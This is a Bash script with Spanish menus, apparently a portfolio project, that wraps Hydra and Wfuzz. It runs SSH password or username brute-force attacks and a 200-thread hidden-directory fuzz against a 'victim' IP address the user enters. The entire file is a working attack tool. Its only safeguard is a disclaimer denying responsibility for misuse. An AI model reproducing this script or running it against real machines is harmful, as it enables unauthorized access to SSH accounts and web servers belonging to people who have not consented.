#!/bin/bash
while true
do
clear
echo "                                                ADVERTENCIA:                                             "
echo "Este script esta creado con herramientas de fuerza bruta de entornos Linux."
echo "No nos hacemos responsables del uso indebido o no autorizado que terceros puedan realizar de este script."
echo "Este script es exclusivamente para mi landing page en el apartado de proyectos, es su único fin."
echo "========================================================================================================="
echo "                                                                                                         "
echo "==================================== MENÚ ==============================="
echo "================= 1. Ataque de fuerza bruta con HYDRA. =================="
echo "================= 2. Ataque de fuerza bruta con WFUZZ. ==============="
echo "================= 3. Salir. ============================================="
echo "========================================================================="
echo "Escoge una opción:"
read option
case $option in
1) 
if ! command -v hydra &> /dev/null; then
echo "No tienes instalado hydra. Ejecuta el comando sudo apt install hydra." && exit
sleep 3
else
echo "Tienes instalado hydra, a continuación se le mostrará el menú."
sleep 3
fi
clear
echo "Para hacer el ataque es necesario que la máquina víctima tenga el puerto SSH abierto."
read -p "Vamos a hacer un ataque a un dispositivo cuyo usuario o contraseña sabemos. ¿Cúal conoces?: 1. Usuario. 2. Contraseña: " option1
case $option1 in
1) #CONOCES EL USUARIO
echo "El parámetro que sabes es el usuario"
sleep 2
read -p "Indica la dirección IP de la máquina víctima: " ip
read -p "Por favor, escribe el nombre del usuario: " usuario
sleep 2
read -p "Indica la localización del diccionario donde se encuentren las contraseñas a probar: " lista
echo "Probando las distintas contraseñas, este proceso puede durar varios minutos, por favor, mantenga el ordenador operativo y conectado a su red."
hydra ssh://$ip -l $usuario -P $lista
sleep 10
;;
2) #CONOCES LA CONTRASEÑA
echo "El parámetro que sabes es la contraseña"
sleep 2
read -p "Indica la dirección IP de la máquina víctima: " ip
read -p "Por favor, escribe la contraseña del usuario: " contrasena  
sleep 2
read -p "Indica la localización del diccionario donde se encuentren las contraseñas a probar: " lista
echo "Probando las distintas contraseñas, este proceso puede durar varios minutos, por favor, mantenga el ordenador operativo y conectado a su red."
sleep 3
hydra ssh://$ip -p $contrasena -L $lista 
sleep 10
;;
esac
;;
2)
if ! command -v wfuzz &> /dev/null; then
echo "No tienes instalado wfuzz. Ejecuta el comando sudo apt install wfuzz."
sleep 3
else
echo "Tienes instalado wfuzz, a continuación se le mostrará el menú."
sleep 3
fi
echo "Vamos a hacer un ataque para sacar directorios ocultos, es importante que la máquina víctima tenga abierto el puerto HTTP."
sleep 2
read -p "Indique la dirección IP de la máquina víctima: " ip
read -p "Indica la localización del diccionario donde se encuentran los posibles directorios: " lista
echo "Probando los posibles directorios, este proceso puede durar varios minutos, por favor, mantenga el ordenador operativo y conectado a su red."
sleep 3
wfuzz -c --hc=404 -t 200 -w $lista -u http://$ip/FUZZ
sleep 5
;;
3)
echo "Saliendo del script..."
sleep 3
exit 0
;;
esac
done
